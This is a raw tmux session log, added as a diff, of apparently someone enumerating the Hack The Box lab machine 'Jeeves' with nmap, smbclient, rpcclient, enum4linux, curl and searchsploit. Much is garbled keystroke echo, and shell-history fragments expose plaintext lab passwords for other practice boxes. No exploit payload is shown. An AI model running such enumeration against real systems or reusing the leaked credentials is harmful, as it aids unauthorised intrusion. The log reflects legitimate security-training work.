@@ -2285,3 +2285,1769 @@
 [2026-02-04 17:15:55] [w=1:tmux] [p=%1] [OUT] :: Progress: [4562/4750] :: Job [1/1] :: 1351 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
 [2026-02-04 17:15:55] [w=1:tmux] [p=%1] [OUT] :: Progress: [4718/4750] :: Job [1/1] :: 1250 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
 [2026-02-04 17:15:55] [w=1:tmux] [p=%1] [OUT] :: Progress: [4750/4750] :: Job [1/1] :: 1257 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] ns    .txt
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] n     
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] ns.txto
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] i
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] ons.txts
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] ions.txtr
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] sions.txte
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] rsions.txtV
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] ersions.txts
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] Versions.txte
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] sVersions.txtc
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] esVersions.txti
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] cesVersions.txtvnscatr
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] catvicesVersions.txte
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] rvicesVersions.txtS
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] ervicesVersions.txtp
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] ServicesVersions.txta
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] pServicesVersions.txtm
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] apServicesVersions.txtN
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] mapServicesVersions.txtynscatp
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] catyNmapServicesVersions.txt
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] pyNmapServicesVersions.txtu
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] ppyNmapServicesVersions.txtp
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] uppyNmapServicesVersions.txt/
+[2026-02-05 16:28:56] [w=1:tmux] [p=%1] [OUT] ../nmap/puppyNmapServicesVersions.txtp
+[2026-02-05 16:28:59] [w=1:tmux] [p=%1] [OUT] /puppyNmapServicesVersions.txtp/ceon/J
+[2026-02-05 16:29:00] [w=1:tmux] [p=%1] [OUT] / puppyNmapServicesVersions.txt/J
+[2026-02-05 16:29:06] [w=1:tmux] [p=%1] [OUT] ../nmap/Jeeves../nmap/Jeevese v e e J / puppyNmapServicesVersions.txt/j
+[2026-02-05 16:29:08] [w=1:tmux] [p=%1] [OUT] ../nmap/jeeJves../nmap/Jeeves../nmap/Jeeves
+[2026-02-05 16:29:08] [w=1:tmux] [p=%1] [OUT] Completing file
+[2026-02-05 16:29:08] [w=1:tmux] [p=%1] [OUT] JeevesAllPorts.gnmap        JeevesAllPorts.xml
+[2026-02-05 16:29:08] [w=1:tmux] [p=%1] [OUT] JeevesAllPorts.nmap         JeevesServicesVersions.txt
+[2026-02-05 16:29:08] [w=1:tmux] [p=%1] [OUT] cat ../nmap/Jeeves../nmap/JeevessAllPorts.gnmap
+[2026-02-05 16:29:14] [w=1:tmux] [p=%1] [OUT] cat ../nmap/JeevesAllPorts.gnmap
+[2026-02-05 16:29:14] [w=1:tmux] [p=%1] [OUT] JeevesAllPorts.gnmap
+[2026-02-05 16:29:14] [w=1:tmux] [p=%1] [OUT] cat ../nmap/JeevesAllPorts.gnmapnmap 
+[2026-02-05 16:29:14] [w=1:tmux] [p=%1] [OUT] JeevesAllPorts.nmap
+[2026-02-05 16:29:14] [w=1:tmux] [p=%1] [OUT] cat ../nmap/JeevesAllPorts.nmapxml 
+[2026-02-05 16:29:14] [w=1:tmux] [p=%1] [OUT] JeevesAllPorts.xml
+[2026-02-05 16:29:15] [w=1:tmux] [p=%1] [OUT] cat ../nmap/JeevesAllPorts.xmlServicesVersions.txt
+[2026-02-05 16:29:15] [w=1:tmux] [p=%1] [OUT] Completing file
+[2026-02-05 16:29:15] [w=1:tmux] [p=%1] [OUT] JeevesAllPorts.gnmap        JeevesAllPorts.xml
+[2026-02-05 16:29:15] [w=1:tmux] [p=%1] [OUT] JeevesAllPorts.nmap         JeevesServicesVersions.txt
+[2026-02-05 16:29:18] [w=1:tmux] [p=%1] [OUT] cat ../nmap/JeevesServicesVersions.txt
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT]  
+[2026-02-05 16:29:20] [pane=%1] [CMD_START] cat ../nmap/JeevesServicesVersions.txt
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] # Nmap 7.98 scan initiated Wed Feb  4 19:34:40 2026 as: /usr/lib/nmap/nmap --privileged -p80,135,445,50000 -sSCV --min-rate=2000 -Pn -oN nmap/JeevesServicesVersions.txt 10.129.228.112
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] Nmap scan report for 10.129.228.112
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] Host is up (0.033s latency).
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] PORT      STATE SERVICE      VERSION
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] 80/tcp    open  http         Microsoft IIS httpd 10.0
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] | http-methods:
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |_  Potentially risky methods: TRACE
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |_http-server-header: Microsoft-IIS/10.0
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |_http-title: Ask Jeeves
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] 135/tcp   open  msrpc        Microsoft Windows RPC
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] 50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |_http-title: Error 404 Not Found
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |_http-server-header: Jetty(9.4.z-SNAPSHOT)
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] Host script results:
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] | smb-security-mode:
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |   account_used: guest
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |   authentication_level: user
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |   challenge_response: supported
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |_  message_signing: disabled (dangerous, but default)
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |_clock-skew: mean: -1h59m51s, deviation: 0s, median: -1h59m52s
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] | smb2-security-mode:
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |   3.1.1:
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |_    Message signing enabled but not required
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] | smb2-time:
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |   date: 2026-02-04T22:34:58
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] |_  start_date: 2026-02-04T22:05:08
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[2026-02-05 16:29:20] [w=1:tmux] [p=%1] [OUT] # Nmap done at Wed Feb  4 19:35:27 2026 -- 1 IP address (1 host up) scanned in 47.11 seconds
+[2026-02-05 16:30:43] [w=1:tmux] [p=%1] [OUT] cmc ccat ../nmap/JeevesServicesVersions.txt
+[2026-02-05 16:30:44] [w=1:tmux] [p=%1] [OUT] xxxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.confxm
+[2026-02-05 16:30:45] [w=1:tmux] [p=%1] [OUT] xmbxm x xc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf
+[2026-02-05 16:30:45] [w=1:tmux] [p=%1] [OUT] xxxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.confxm
+[2026-02-05 16:30:46] [w=1:tmux] [p=%1] [OUT] xmbxm x xc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf
+[2026-02-05 16:30:55] [w=1:tmux] [p=%1] [OUT] xxxc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.confxm
+[2026-02-05 16:30:56] [w=1:tmux] [p=%1] [OUT] x xc smb frizzDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file ./krb5.conf
+[2026-02-05 16:30:57] [w=1:tmux] [p=%1] [OUT] sssearchsploit -m windows/remote/36318.txtsm
+[2026-02-05 16:31:13] [w=1:tmux] [p=%1] [OUT] bclient //10.129.232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'smbY.HTbc.HTBclHTB\liTB\lieB\leen\levntlevismbclientt evit /////1//10.129,
+[2026-02-05 16:31:16] [w=1:tmux] [p=%1] [OUT]  .232.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'.22
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] 8.112 ---N
+[2026-02-05 16:31:21] [pane=%1] [CMD_START] smbclient //10.129.228.112 -N
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] \\10.129.228.112: Not enough '\' characters in service
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [--leak-report] [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [-O|--socket-options=SOCKETOPTIONS] [-m|--max-protocol=MAXPROTOCOL]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [-n|--netbiosname=NETBIOSNAME] [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [--realm=REALM] [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]] [-N|--no-pass]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [--password=STRING] [--pw-nt-hash] [-A|--authentication-file=FILE]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [-P|--machine-pass] [--simple-bind-dn=DN] [--use-kerberos=desired|required|off]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [--use-krb5-ccache=CCACHE] [--use-winbind-ccache]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [--client-protection=sign|encrypt|off] [-k|--kerberos] [-V|--version]
+[2026-02-05 16:31:21] [w=1:tmux] [p=%1] [OUT] [OPTIONS] service <password>
+[2026-02-05 16:31:36] [w=1:tmux] [p=%1] [OUT] bclient //10.129.228.112 -N                             sssmbclient //10.129.228.112 -Nsmsmbsmbclient-N/ -N
+[2026-02-05 16:31:36] [pane=%1] [CMD_START] smbclient //10.129.228.112/ -N
+[2026-02-05 16:42:44] [w=1:tmux] [p=%1] [OUT] bck-i-search: _smbclient //10.129.228.112/ -Ns_smm_smbb_bcc_cll_lii_iee_enn_ntt_ -N 32.75/DEV -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'
+[2026-02-05 16:42:54] [w=1:tmux] [p=%1] [OUT] bck-i-search: smbclient_SYSVOL -U "PUPPY.HTB\levi.james"%'KingofAkron2025!'DEV-SHARE for PUPPY-DEVS -U "PUPPY.HTB\levi.james"%'KingofAkron2025!''DEV-SHARE for PUPPY-DEVS' -U "PUPPY.HTB\levi.james"%'KingofAkron2025!' -U "PUPPY                          levi.          adam.silver"%'Password123!'    --sharesnote command impacket-smbclient DC01.certified.htb/judith.mader:'judith09'@10.129.231.186 -- gives us a smb share as judith$impacket-smbclient cd01.certified.htb/@certified.htbsmb access with null session but nothing is allowed.
+[2026-02-05 16:42:54] [w=1:tmux] [p=%1] [OUT] bck-i-search: smbclient_impacket-smbclient DC01.certified.htb/judith.mader:'judith09'@10.129.231.186
+[2026-02-05 16:42:59] [w=1:tmux] [p=%1] [OUT] dc/judith.mader              certified:'j   ..htb/certified@10.129.231.186@certified.htb          cd-k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htb10.129.71.156    frizz.htb/f.
+[2026-02-05 16:43:01] [w=1:tmux] [p=%1] [OUT] zle:'Jenni_Luvs_Magic23'@10.129.71.156'f.frizzle:Jenni_@frizz.htb'              frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'@frizzdc.frizz.htb-k -no-pass
+[2026-02-05 16:43:01] [w=1:tmux] [p=%1] [OUT] z.htb/f.frizzle:'Jenni_Luvs_Magic23'@10.129.68.132frizz.htb/f.
+[2026-02-05 16:43:03] [w=1:tmux] [p=%1] [OUT] 232.168'f.frizzle:Jenni_frizz.htb               smbclient
+[2026-02-05 16:43:08] [w=1:tmux] [p=%1] [OUT] failing bck-i-search: smbclient_
+[2026-02-05 16:44:11] [w=1:tmux] [p=%1] [OUT] pppwdpi px ensurepathpin            g -c 1 frizzdc.frizz.htb | tee logs/homepage.html ng -dcpingg -cg /
+[2026-02-05 16:44:14] [w=1:tmux] [p=%1] [OUT] ////1//1 ///  -c 1 frizzdc.frizz.htb | tee logs/homepage.html
+[2026-02-05 16:44:14] [w=1:tmux] [p=%1] [OUT] -c 1 frizzdc.frizz.htb | tee logs/homepage.html n
+[2026-02-05 16:44:14] [w=1:tmux] [p=%1] [OUT] ping -c 1 frizzdc.frizz.htb | tee logs/homepage.html pi
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] px ensurepathp              pwdwd smbclient //10.129.228.112/ -Nsmbclient-N -N 
+[2026-02-05 16:54:03] [pane=%1] [CMD_START] smbclient //10.129.228.112 -N
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] \\10.129.228.112: Not enough '\' characters in service
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [--leak-report] [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [-O|--socket-options=SOCKETOPTIONS] [-m|--max-protocol=MAXPROTOCOL]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [-n|--netbiosname=NETBIOSNAME] [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [--realm=REALM] [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]] [-N|--no-pass]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [--password=STRING] [--pw-nt-hash] [-A|--authentication-file=FILE]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [-P|--machine-pass] [--simple-bind-dn=DN] [--use-kerberos=desired|required|off]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [--use-krb5-ccache=CCACHE] [--use-winbind-ccache]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [--client-protection=sign|encrypt|off] [-k|--kerberos] [-V|--version]
+[2026-02-05 16:54:03] [w=1:tmux] [p=%1] [OUT] [OPTIONS] service <password>
+[2026-02-05 16:54:18] [pane=%1] [CMD_START] smbclient \\10.129.228.112 -N
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] \10.129.228.112: Not enough '\' characters in service
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [--leak-report] [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [-O|--socket-options=SOCKETOPTIONS] [-m|--max-protocol=MAXPROTOCOL]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [-n|--netbiosname=NETBIOSNAME] [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [--realm=REALM] [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]] [-N|--no-pass]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [--password=STRING] [--pw-nt-hash] [-A|--authentication-file=FILE]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [-P|--machine-pass] [--simple-bind-dn=DN] [--use-kerberos=desired|required|off]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [--use-krb5-ccache=CCACHE] [--use-winbind-ccache]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [--client-protection=sign|encrypt|off] [-k|--kerberos] [-V|--version]
+[2026-02-05 16:54:18] [w=1:tmux] [p=%1] [OUT] [OPTIONS] service <password>
+[2026-02-05 16:54:23] [pane=%1] [CMD_START] smbclient \\10.129.228.112\ -N
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] \10.129.228.112 -N: Not enough '\' characters in service
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-T|--tar=<c|x>IXFvgbNan]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [-B|--browse] [-d|--debuglevel=DEBUGLEVEL] [--debug-stdout]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [-s|--configfile=CONFIGFILE] [--option=name=value] [-l|--log-basename=LOGFILEBASE]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [--leak-report] [--leak-report-full] [-R|--name-resolve=NAME-RESOLVE-ORDER]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [-O|--socket-options=SOCKETOPTIONS] [-m|--max-protocol=MAXPROTOCOL]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [-n|--netbiosname=NETBIOSNAME] [--netbios-scope=SCOPE] [-W|--workgroup=WORKGROUP]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [--realm=REALM] [-U|--user=[DOMAIN/]USERNAME[%PASSWORD]] [-N|--no-pass]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [--password=STRING] [--pw-nt-hash] [-A|--authentication-file=FILE]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [-P|--machine-pass] [--simple-bind-dn=DN] [--use-kerberos=desired|required|off]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [--use-krb5-ccache=CCACHE] [--use-winbind-ccache]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [--client-protection=sign|encrypt|off] [-k|--kerberos] [-V|--version]
+[2026-02-05 16:54:23] [w=1:tmux] [p=%1] [OUT] [OPTIONS] service <password>
+[2026-02-05 16:54:37] [pane=%1] [CMD_START] smbclient //10.129.228.112/ -N
+[2026-02-05 16:55:20] [pane=%1] [CMD_START] rpcclient 10.129.228.112
+[2026-02-05 16:55:22] [w=1:tmux] [p=%1] [OUT] Password for [WORKGROUP\b7h30]:
+[2026-02-05 16:55:22] [w=1:tmux] [p=%1] [OUT] Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+[2026-02-05 16:55:27] [pane=%1] [CMD_START] rpcclient 10.129.228.112 -N
+[2026-02-05 16:55:27] [w=1:tmux] [p=%1] [OUT] Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+[2026-02-05 16:57:02] [w=1:tmux] [p=%1] [OUT] e
+[2026-02-05 16:57:02] [w=1:tmux] [p=%1] [OUT] k
+[2026-02-05 16:57:04] [w=1:tmux] [p=%1] [OUT] kigs  
+[2026-02-05 16:57:04] [w=1:tmux] [p=%1] [OUT] k 
+[2026-02-05 16:57:05] [w=1:tmux] [p=%1] [OUT] l
+[2026-02-05 16:57:33] [w=1:tmux] [p=%1] [OUT] logs/enub m4linux.txtenum4linux -a| teeenum4linux -a| tee  
+[2026-02-05 16:57:33] [w=1:tmux] [p=%1] [OUT] l
+[2026-02-05 16:57:35] [pane=%1] [CMD_START] enum4linux -a 10.129.228.112 | tee enum4linux.txt
+[2026-02-05 16:57:35] [w=1:tmux] [p=%1] [OUT] Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb  5 16:57:35 2026
+[2026-02-05 16:57:35] [w=1:tmux] [p=%1] [OUT] =========================================( Target Information )=========================================
+[2026-02-05 16:57:35] [w=1:tmux] [p=%1] [OUT] Target ........... 10.129.228.112
+[2026-02-05 16:57:35] [w=1:tmux] [p=%1] [OUT] RID Range ........ 500-550,1000-1050
+[2026-02-05 16:57:35] [w=1:tmux] [p=%1] [OUT] Username ......... ''
+[2026-02-05 16:57:35] [w=1:tmux] [p=%1] [OUT] Password ......... ''
+[2026-02-05 16:57:35] [w=1:tmux] [p=%1] [OUT] Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+[2026-02-05 16:57:35] [w=1:tmux] [p=%1] [OUT] ===========================( Enumerating Workgroup/Domain on 10.129.228.112 )===========================
+[2026-02-05 16:57:45] [w=1:tmux] [p=%1] [OUT] [E] Can't find workgroup/domain
+[2026-02-05 16:57:45] [w=1:tmux] [p=%1] [OUT] ===============================( Nbtstat Information for 10.129.228.112 )===============================
+[2026-02-05 16:57:50] [w=0:tmux] [p=%0] [OUT] -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o jetty-big.json -of-mc-fc-e -tcurlH "Host: localhost" http://10.129.228.112:50000/
+[2026-02-05 16:57:50] [w=0:tmux] [p=%0] [OUT] "Host: localhost"
+[2026-02-05 16:57:50] [w=0:tmux] [p=%0] [OUT] .129.228.112:50000/127.0.0.1
+[2026-02-05 16:57:54] [w=0:tmux] [p=%0] [OUT] cccurl -H "Host: 127.0.0.1" http://10.129.228.112:50000/cucurrlcurll l ---I
+[2026-02-05 16:57:55] [w=1:tmux] [p=%1] [OUT] Looking up status of 10.129.228.112
+[2026-02-05 16:57:55] [w=1:tmux] [p=%1] [OUT] No reply from 10.129.228.112
+[2026-02-05 16:57:55] [w=1:tmux] [p=%1] [OUT] ==================================( Session Check on 10.129.228.112 )==================================
+[2026-02-05 16:57:55] [w=1:tmux] [p=%1] [OUT] [E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
+[2026-02-05 16:57:55] [w=0:tmux] [p=%0] [OUT] I I http
+[2026-02-05 16:57:55] [w=0:tmux] [p=%0] [OUT] Completing URL
+[2026-02-05 16:57:55] [w=0:tmux] [p=%0] [OUT] http://   https://
+[2026-02-05 16:58:07] [w=0:tmux] [p=%0] [OUT] curl -I http://101.129.228.112/jeev
+[2026-02-05 16:58:07] [w=0:tmux] [p=%0] [OUT] e
+[2026-02-05 16:58:13] [w=0:tmux] [p=%0] [OUT] es.PH NG
+[2026-02-05 16:58:13] [pane=%0] [CMD_START] curl -I http://101.129.228.112/jeeves.PNG
+[2026-02-05 16:58:32] [w=0:tmux] [p=%0] [OUT] ^C
+[2026-02-05 16:58:37] [w=0:tmux] [p=%0] [OUT] curl -Icurl -Icurl -Icurl -Ies.PNG
+[2026-02-05 16:58:37] [pane=%0] [CMD_START] curl -I http://10.129.228.112/jeeves.PNG
+[2026-02-05 16:58:38] [w=0:tmux] [p=%0] [OUT] HTTP/1.1 200 OK
+[2026-02-05 16:58:38] [w=0:tmux] [p=%0] [OUT] Content-Length: 463431
+[2026-02-05 16:58:38] [w=0:tmux] [p=%0] [OUT] Content-Type: image/png
+[2026-02-05 16:58:38] [w=0:tmux] [p=%0] [OUT] Last-Modified: Mon, 06 Nov 2017 02:08:06 GMT
+[2026-02-05 16:58:38] [w=0:tmux] [p=%0] [OUT] Accept-Ranges: bytes
+[2026-02-05 16:58:38] [w=0:tmux] [p=%0] [OUT] ETag: "078c15a456d31:0"
+[2026-02-05 16:58:38] [w=0:tmux] [p=%0] [OUT] Server: Microsoft-IIS/10.0
+[2026-02-05 16:58:38] [w=0:tmux] [p=%0] [OUT] Date: Fri, 06 Feb 2026 02:57:48 GMT
+[2026-02-05 17:21:08] [pane=%1] [CMD_START] ll
+[2026-02-05 17:21:08] [w=1:tmux] [p=%1] [OUT] total 328
+[2026-02-05 17:21:08] [w=1:tmux] [p=%1] [OUT] -rw-r--r-- 1 b7h30 b7h30    504 Feb  4 16:49 36318.txt
+[2026-02-05 17:21:08] [w=1:tmux] [p=%1] [OUT] -rw-r--r-- 1 b7h30 b7h30    739 Feb  4 16:49 50438.txt
+[2026-02-05 17:21:08] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30   6888 Feb  5 17:21 cmd.log
+[2026-02-05 17:21:08] [w=1:tmux] [p=%1] [OUT] -rwxrwxr-x 1 b7h30 b7h30    369 Feb  4 17:14 commonContextPaths.sh
+[2026-02-05 17:21:08] [w=1:tmux] [p=%1] [OUT] -rw-rw-r-- 1 b7h30 b7h30   1080 Feb  5 16:57 enum4linux.txt
